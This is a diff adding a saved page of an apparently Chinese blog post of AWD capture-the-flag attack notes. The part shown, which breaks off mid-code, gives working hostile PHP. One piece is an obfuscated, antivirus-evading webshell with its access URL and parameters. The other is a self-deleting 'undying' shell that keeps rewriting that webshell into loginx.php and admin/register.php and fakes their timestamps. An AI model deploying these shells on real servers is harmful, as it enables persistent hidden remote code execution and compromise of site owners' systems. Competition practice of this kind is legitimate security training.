@@ -1,0 +1,732 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fa.png">
+  <link rel="icon" href="/img/fa.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="k3rwin">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="AWD笔记一.Attack ssh上去快速打包web源码，本地webshell快速扫描分析，删除后门代码的同时，批量利用后门代码植入一遍内存马  1.php免杀马 http:&#x2F;&#x2F;xx&#x2F;webshell.php?NGHy[]&#x3D;2&amp;cskO[]&#x3D;1 Post:jMJFg[]&#x3D;2&amp;hwzcu[]&#x3D;1&amp;vr4E7SZ Base64  12345678910111">
+<meta property="og:type" content="article">
+<meta property="og:title" content="awd_note">
+<meta property="og:url" content="https://k3rwin.github.io/2023/11/13/awd-note/index.html">
+<meta property="og:site_name" content="K3rwin&#39;s Blog">
+<meta property="og:description" content="AWD笔记一.Attack ssh上去快速打包web源码，本地webshell快速扫描分析，删除后门代码的同时，批量利用后门代码植入一遍内存马  1.php免杀马 http:&#x2F;&#x2F;xx&#x2F;webshell.php?NGHy[]&#x3D;2&amp;cskO[]&#x3D;1 Post:jMJFg[]&#x3D;2&amp;hwzcu[]&#x3D;1&amp;vr4E7SZ Base64  12345678910111">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-11-13T08:29:26.000Z">
+<meta property="article:modified_time" content="2023-11-20T09:26:14.044Z">
+<meta property="article:author" content="k3rwin">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>awd_note - K3rwin&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"k3rwin.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":21395677,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    <!-- 51.la Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('//js.users.51.la/21395677.js');
+      }
+    </script>
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>K3rwin&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202207301915872.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="awd_note"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        k3rwin
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-13 16:29" pubdate>
+          2023年11月13日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          70 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">awd_note</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="AWD笔记"><a href="#AWD笔记" class="headerlink" title="AWD笔记"></a>AWD笔记</h1><h2 id="一-Attack"><a href="#一-Attack" class="headerlink" title="一.Attack"></a>一.Attack</h2><blockquote>
+<p>ssh上去快速打包web源码，本地webshell快速扫描分析，删除后门代码的同时，批量利用后门代码植入一遍内存马</p>
+</blockquote>
+<h3 id="1-php免杀马"><a href="#1-php免杀马" class="headerlink" title="1.php免杀马"></a>1.php免杀马</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="http://xx/webshell.php?NGHy%5B%5D=2&amp;cskO%5B%5D=1">http://xx/webshell.php?NGHy[]=2&amp;cskO[]=1</a></p>
+<p>Post:jMJFg[]&#x3D;2&amp;hwzcu[]&#x3D;1&amp;vr4E7SZ</p>
+<p>Base64</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$tBzb</span>=<span class="hljs-string">&#x27;str_&#x27;</span>;<br>    <span class="hljs-variable">$rnZy</span>=<span class="hljs-variable">$tBzb</span>.<span class="hljs-string">&#x27;replace&#x27;</span>;<br>    <span class="hljs-variable">$FtPk</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$rnZy</span>,<span class="hljs-number">6</span>);<br>    <span class="hljs-variable">$gEXT</span>=<span class="hljs-string">&#x27;zxcszxctzxcrzxc_zxcrzxcezxc&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NGHy&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cskO&#x27;</span>] &amp;&amp; @<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NGHy&#x27;</span>]) === @<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cskO&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$teVZ</span> = <span class="hljs-string">&#x27;str_re&#x27;</span>;<br>    <span class="hljs-variable">$gEXT</span>=<span class="hljs-title function_ invoke__">substr_replace</span>(<span class="hljs-string">&#x27;zxc&#x27;</span>,<span class="hljs-variable">$teVZ</span>,<span class="hljs-variable">$gEXT</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">die</span>();&#125;<br>    <span class="hljs-variable">$FtPk</span>=<span class="hljs-variable">$gEXT</span>.<span class="hljs-variable">$FtPk</span>;<br>    <span class="hljs-variable">$xkOz</span> = <span class="hljs-variable">$FtPk</span>(<span class="hljs-string">&quot;lxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOc&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;str_lxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOcrlxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOceplalxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOcclxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOcelxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOc&quot;</span>);<br>    <span class="hljs-variable">$ZWmQ</span> = <span class="hljs-variable">$xkOz</span>(<span class="hljs-string">&quot;GLrSY9Wgwyjti36pmV4RPIk0TsoJZ5AuM7xXcbqUeKv2QDFBCf&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;baseGLrSY9Wgwyjti36pmV4RPIk0TsoJZ5AuM7xXcbqUeKv2QDFBCf64_dGLrSY9Wgwyjti36pmV4RPIk0TsoJZ5AuM7xXcbqUeKv2QDFBCfecoGLrSY9Wgwyjti36pmV4RPIk0TsoJZ5AuM7xXcbqUeKv2QDFBCfdeGLrSY9Wgwyjti36pmV4RPIk0TsoJZ5AuM7xXcbqUeKv2QDFBCf&quot;</span>);<br>    <span class="hljs-variable">$oILO</span> = <span class="hljs-variable">$ZWmQ</span>(<span class="hljs-variable">$xkOz</span>(<span class="hljs-string">&quot;lCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGF&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;Y3lCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFJlYXlCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFRlX2lCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFZ1lCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFbmN0lCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFalCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFWlCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGF9ulCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGF&quot;</span>));<br>    <span class="hljs-variable">$QenO</span> = <span class="hljs-variable">$ZWmQ</span>(<span class="hljs-variable">$xkOz</span>(<span class="hljs-string">&quot;sOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJ&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;ZXsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJZhbCsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJgsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJkX1sOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJBPsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJU1RbsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJJwsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJ==sOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJ&quot;</span>));<br>    <span class="hljs-variable">$DAvG</span> = <span class="hljs-variable">$ZWmQ</span>(<span class="hljs-variable">$xkOz</span>(<span class="hljs-string">&quot;MNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIs&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;dMNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIsnI0RMNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIsTdTMNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIsWMNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIsgMNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIs==MNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIs&quot;</span>));<br>    <span class="hljs-variable">$KSCi</span> = <span class="hljs-variable">$ZWmQ</span>(<span class="hljs-variable">$xkOz</span>(<span class="hljs-string">&quot;2ysd87jV5oaeI9xRQOLM3cUJXvh1pSZBPHkuFf4wiYmGDKbgTl&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;J12ysd87jV5oaeI9xRQOLM3cUJXvh1pSZBPHkuFf4wiYmGDKbgTl02ysd87jV5oaeI9xRQOLM3cUJXvh1pSZBPHkuFf4wiYmGDKbgTlpOw=2ysd87jV5oaeI9xRQOLM3cUJXvh1pSZBPHkuFf4wiYmGDKbgTl=2ysd87jV5oaeI9xRQOLM3cUJXvh1pSZBPHkuFf4wiYmGDKbgTl&quot;</span>));<br>    @<span class="hljs-variable">$vNTbd</span> = <span class="hljs-variable">$QenO</span>;<br>    @<span class="hljs-variable">$$vNTbd</span> = <span class="hljs-variable">$DAvG</span>;<br>    @<span class="hljs-variable">$LDUmN</span>=<span class="hljs-variable">$vNTbd</span>.<span class="hljs-variable">$$vNTbd</span>;<br>    @<span class="hljs-variable">$BIiCw</span>=<span class="hljs-variable">$LDUmN</span>;<br>    @<span class="hljs-variable">$$BIiCw</span>=<span class="hljs-variable">$KSCi</span>;<br>    @<span class="hljs-variable">$TsxFw</span>=<span class="hljs-variable">$BIiCw</span>;<br>    @<span class="hljs-variable">$YnGke</span>=<span class="hljs-variable">$$BIiCw</span>;<br>    @<span class="hljs-variable">$udasE</span> = <span class="hljs-variable">$oILO</span>(<span class="hljs-string">&#x27;$gUVnv,$MLShB&#x27;</span>,<span class="hljs-string">&#x27;return &quot;$gUVnv&quot;.&quot;$MLShB&quot;;&#x27;</span>);<br>    @<span class="hljs-variable">$gSBdP</span>=<span class="hljs-variable">$udasE</span>(<span class="hljs-variable">$TsxFw</span>,<span class="hljs-variable">$YnGke</span>);<br>    @<span class="hljs-variable">$BvHh</span> = <span class="hljs-variable">$oILO</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$gSBdP</span>);<br>    @<span class="hljs-variable">$BvHh</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="2-php不死马，上传后访问php文件"><a href="#2-php不死马，上传后访问php文件" class="headerlink" title="2.php不死马，上传后访问php文件"></a>2.php不死马，上传后访问php文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">while</span> (True) &#123;<br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>();<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file1</span> = <span class="hljs-string">&#x27;./loginx.php&#x27;</span>;<br>    <span class="hljs-variable">$file2</span> = <span class="hljs-string">&#x27;./admin/register.php&#x27;</span>; <br>    <span class="hljs-variable">$shelltime</span> = <span class="hljs-string">&quot;\&quot;2020-01-05 02:17:14\&quot;&quot;</span>;<br><span class="hljs-variable">$shell</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&quot;PD9waHAKICAgICR0QnpiPSdzdHJfJzsKICAgICRyblp5PSR0QnpiLidyZXBsYWNlJzsKICAgICRGdFBrPXN1YnN0cigkcm5aeSw2KTsKICAgICRnRVhUPSd6eGNzenhjdHp4Y3J6eGNfenhjcnp4Y2V6eGMnOwogICAgaWYgKCRfR0VUWydOR0h5J10gIT09ICRfR0VUWydjc2tPJ10gJiYgQG1kNSgkX0dFVFsnTkdIeSddKSA9PT0gQG1kNSgkX0dFVFsnY3NrTyddKSl7CiAgICAkdGVWWiA9ICdzdHJfcmUnOwogICAgJGdFWFQ9c3Vic3RyX3JlcGxhY2UoJ3p4YycsJHRlVlosJGdFWFQpOwogICAgfWVsc2V7ZGllKCk7fQogICAgJEZ0UGs9JGdFWFQuJEZ0UGs7CiAgICAkeGtPeiA9ICRGdFBrKCJseHJUUUdDVUhFYXpoZnNQcGpxdzRLbk1vWVdlYlpOSXU1dGtTOTJGWEw2Z2RKdkFPYyIsICIiLCAic3RyX2x4clRRR0NVSEVhemhmc1BwanF3NEtuTW9ZV2ViWk5JdTV0a1M5MkZYTDZnZEp2QU9jcmx4clRRR0NVSEVhemhmc1BwanF3NEtuTW9ZV2ViWk5JdTV0a1M5MkZYTDZnZEp2QU9jZXBsYWx4clRRR0NVSEVhemhmc1BwanF3NEtuTW9ZV2ViWk5JdTV0a1M5MkZYTDZnZEp2QU9jY2x4clRRR0NVSEVhemhmc1BwanF3NEtuTW9ZV2ViWk5JdTV0a1M5MkZYTDZnZEp2QU9jZWx4clRRR0NVSEVhemhmc1BwanF3NEtuTW9ZV2ViWk5JdTV0a1M5MkZYTDZnZEp2QU9jIik7CiAgICAkWldtUSA9ICR4a096KCJHTHJTWTlXZ3d5anRpMzZwbVY0UlBJazBUc29KWjVBdU03eFhjYnFVZUt2MlFERkJDZiIsICIiLCAiYmFzZUdMclNZOVdnd3lqdGkzNnBtVjRSUElrMFRzb0paNUF1TTd4WGNicVVlS3YyUURGQkNmNjRfZEdMclNZOVdnd3lqdGkzNnBtVjRSUElrMFRzb0paNUF1TTd4WGNicVVlS3YyUURGQkNmZWNvR0xyU1k5V2d3eWp0aTM2cG1WNFJQSWswVHNvSlo1QXVNN3hYY2JxVWVLdjJRREZCQ2ZkZUdMclNZOVdnd3lqdGkzNnBtVjRSUElrMFRzb0paNUF1TTd4WGNicVVlS3YyUURGQkNmIik7CiAgICAkb0lMTyA9ICRaV21RKCR4a096KCJsQ3NvQWhURVU2UVB3N3ZqSGNpa2c5dXlZMU0yelN0VzROZTBmYXg4RElMUktCT2RHRiIsICIiLCAiWTNsQ3NvQWhURVU2UVB3N3ZqSGNpa2c5dXlZMU0yelN0VzROZTBmYXg4RElMUktCT2RHRkpsWVhsQ3NvQWhURVU2UVB3N3ZqSGNpa2c5dXlZMU0yelN0VzROZTBmYXg4RElMUktCT2RHRlJsWDJsQ3NvQWhURVU2UVB3N3ZqSGNpa2c5dXlZMU0yelN0VzROZTBmYXg4RElMUktCT2RHRloxbENzb0FoVEVVNlFQdzd2akhjaWtnOXV5WTFNMnpTdFc0TmUwZmF4OERJTFJLQk9kR0ZibU4wbENzb0FoVEVVNlFQdzd2akhjaWtnOXV5WTFNMnpTdFc0TmUwZmF4OERJTFJLQk9kR0ZhbENzb0FoVEVVNlFQdzd2akhjaWtnOXV5WTFNMnpTdFc0TmUwZmF4OERJTFJLQk9kR0ZXbENzb0FoVEVVNlFQdzd2akhjaWtnOXV5WTFNMnpTdFc0TmUwZmF4OERJTFJLQk9kR0Y5dWxDc29BaFRFVTZRUHc3dmpIY2lrZzl1eVkxTTJ6U3RXNE5lMGZheDhESUxSS0JPZEdGIikpOwogICAgJFFlbk8gPSAkWldtUSgkeGtPeigic093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEoiLCAiIiwgIlpYc093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEpaaGJDc093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEpnc093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEprWDFzT3dCS1d1NWRQMHplcjdnYzFEbnZSWFp4bWE2a29xUWxVQTg0VkZ5TlRmU2loakhwSkJQc093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEpVMVJic093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEpKd3NPd0JLV3U1ZFAwemVyN2djMURudlJYWnhtYTZrb3FRbFVBODRWRnlOVGZTaWhqSHBKPT1zT3dCS1d1NWRQMHplcjdnYzFEbnZSWFp4bWE2a29xUWxVQTg0VkZ5TlRmU2loakhwSiIpKTsKICAgICREQXZHID0gJFpXbVEoJHhrT3ooIk1OSGVUYXczU0xRb0JZUkdKYkFwN2dxZG02aHJ6eU8yVzg1bDRQdmpuRmN0Q0s5RElzIiwgIiIsICJkTU5IZVRhdzNTTFFvQllSR0piQXA3Z3FkbTZocnp5TzJXODVsNFB2am5GY3RDSzlESXNuSTBSTU5IZVRhdzNTTFFvQllSR0piQXA3Z3FkbTZocnp5TzJXODVsNFB2am5GY3RDSzlESXNUZFRNTkhlVGF3M1NMUW9CWVJHSmJBcDdncWRtNmhyenlPMlc4NWw0UHZqbkZjdENLOURJc1dNTkhlVGF3M1NMUW9CWVJHSmJBcDdncWRtNmhyenlPMlc4NWw0UHZqbkZjdENLOURJc2dNTkhlVGF3M1NMUW9CWVJHSmJBcDdncWRtNmhyenlPMlc4NWw0UHZqbkZjdENLOURJcz09TU5IZVRhdzNTTFFvQllSR0piQXA3Z3FkbTZocnp5TzJXODVsNFB2am5GY3RDSzlESXMiKSk7CiAgICAkS1NDaSA9ICRaV21RKCR4a096KCIyeXNkODdqVjVvYWVJOXhSUU9MTTNjVUpYdmgxcFNaQlBIa3VGZjR3aVltR0RLYmdUbCIsICIiLCAiSjEyeXNkODdqVjVvYWVJOXhSUU9MTTNjVUpYdmgxcFNaQlBIa3VGZjR3aVltR0RLYmdUbDAyeXNkODdqVjVvYWVJOXhSUU9MTTNjVUpYdmgxcFNaQlBIa3VGZjR3aVltR0RLYmdUbHBPdz0yeXNkODdqVjVvYWVJOXhSUU9MTTNjVUpYdmgxcFNaQlBIa3VGZjR3aVltR0RLYmdUbD0yeXNkODdqVjVvYWVJOXhSUU9MTTNjVUpYdmgxcFNaQlBIa3VGZjR3aVltR0RLYmdUbCIpKTsKICAgIEAkdk5UYmQgPSAkUWVuTzsKICAgIEAkJHZOVGJkID0gJERBdkc7CiAgICBAJExEVW1OPSR2TlRiZC4kJHZOVGJkOwogICAgQCRCSWlDdz0kTERVbU47CiAgICBAJCRCSWlDdz0kS1NDaTsKICAgIEAkVHN4Rnc9JEJJaUN3OwogICAgQCRZbkdrZT0kJEJJaUN3OwogICAgQCR1ZGFzRSA9ICRvSUxPKCckZ1VWbnYsJE1MU2hCJywncmV0dXJuICIkZ1VWbnYiLiIkTUxTaEIiOycpOwogICAgQCRnU0JkUD0kdWRhc0UoJFRzeEZ3LCRZbkdrZSk7CiAgICBAJEJ2SGggPSAkb0lMTygiIiwgJGdTQmRQKTsKICAgIEAkQnZIaCgpOwo/Pg==&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file1</span>) || !(<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>,<span class="hljs-title function_ invoke__">filemtime</span>(<span class="hljs-variable">$file1</span>))==<span class="hljs-variable">$shelltime</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;rm -rf &quot;</span>.<span class="hljs-variable">$file1</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file1</span>, <span class="hljs-variable">$shell</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;touch -amd &quot;</span>.<span class="hljs-variable">$shelltime</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$file1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file2</span>) || !(<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>,<span class="hljs-title function_ invoke__">filemtime</span>(<span class="hljs-variable">$file2</span>))==<span class="hljs-variable">$shelltime</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;rm -rf &quot;</span>.<span class="hljs-variable">$file2</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file2</span>, <span class="hljs-variable">$shell</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;touch -amd &quot;</span>.<span 